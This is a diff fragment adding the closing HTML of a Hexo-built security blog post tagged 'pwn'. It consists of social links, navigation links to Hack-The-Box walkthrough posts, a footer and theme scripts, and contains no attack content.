+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/12/01/unicode/" rel="prev" title="Hack-The-Box-walkthrough[unicode]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[unicode]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/18/timing/" rel="next" title="Hack-The-Box-walkthrough[timing]">
+                  Hack-The-Box-walkthrough[timing] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
